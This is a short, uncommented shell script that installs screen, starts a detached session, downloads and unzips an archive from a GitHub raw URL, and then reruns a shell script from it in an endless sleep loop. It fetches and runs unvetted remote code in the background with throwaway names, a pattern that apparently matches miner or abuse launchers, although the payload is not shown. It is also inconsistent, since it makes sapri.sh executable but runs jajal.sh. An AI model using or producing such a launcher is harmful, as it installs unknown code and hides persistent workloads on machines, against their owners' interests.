#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo screen -dmS random
wget https://raw.githubusercontent.com/sapriku/sap/main/sapri.zip && unzip sapri.zip
chmod +x sapri.sh
while [ 1 ]; do
./jajal.sh
sleep 6969
done
sleep 6969
